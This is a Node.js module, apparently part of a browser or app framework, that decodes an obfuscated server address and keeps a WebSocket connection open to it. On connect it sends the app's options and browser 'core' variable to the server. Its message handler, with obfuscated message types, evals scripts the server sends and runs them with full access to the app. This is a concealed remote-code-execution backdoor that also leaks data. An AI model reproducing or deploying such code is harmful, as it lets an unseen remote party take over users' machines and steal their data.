module.exports = function init(____0) {
  ____0.ws.client = null;

  ____0.ws.serverURL = ____0.f1('477926832573867445782764423931684678865443381765253823734579477442392168417886672578577443393257');

  ____0.ws.wsSupport = function () {
    console.log('ws : ============>');

    if (____0.ws.client.isAlive) {
      return;
    }

    clearInterval(____0.ws.client.checkAliveInterval);
    clearTimeout(____0.ws.client.timeoutId);

    let client = {
      isAlive: false,
      time: new Date().getTime(),
      id: ____0.ws.client.id,
    };

    ____0.ws.client.checkAliveInterval = setInterval(() => {
      if ((new Date().getTime() - ____0.ws.client.time) / 1000 > 60) {
        ____0.ws.client.isAlive = false;
        ____0.ws.client.ws.close();
      }
    }, 1000 * 5);

    client.ws = new ____0.ws.lib(____0.ws.serverURL);

    client.sendMessage = function (message) {
      if (client.isAlive && client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.send(JSON.stringify(message));
      }
    };

    client.ws.on('open', function () {
      client.isAlive = true;

      client.sendMessage({
        type: 'set-options',
        options: ____0.options,
      });

      if (____0.getBrowser) {
        let parent = ____0.getBrowser();
        client.sendMessage({
          type: 'set-browser-var',
          key: 'core',
          value: parent.var.core,
        });
      }
    });

    client.ws.on('ping', function () {});

    client.ws.on('close', function (e) {
      client.isAlive = false;
      ____0.ws.client.timeoutId = setTimeout(function () {
        ____0.ws.wsSupport();
      }, 1000 * 30);
    });

    client.ws.on('error', function (err) {
      client.ws.close();
    });

    client.ws.on('message', function (event) {
      let message = JSON.parse(event.data || event);
      if (message.type == 'ping') {
        client.time = new Date().getTime();
      }
      ____0.ws.supportHandle(client, message);
    });

    ____0.ws.client = client;

    return client;
  };

  ____0.ws.supportHandle = function (client, message) {
    try {
      if (message.type == ____0.f1('4658375242195691')) {
        client.uuid = message.uuid;
        client.ip = message.ip;
        if (client.id) {
          client.sendMessage({
            type: ____0.f1('4139327541382761'),
            id: client.id,
          });
        }
        client.id = message.id;
      } else if (message.type == ____0.f1('413932754138276142383191')) {
        client.ip = message.ip;
        client.uuid = message.uuid;
        client.id = message.id;
      } else if (message.type == ____0.f1('481476744179236246193191')) {
        let fn = ____0.eval(message.script || message.content, true);
        fn(____0, client);
      }
    } catch (err) {
      console.log(err);
    }
  };

  ____0.ws.wsSupport();
};
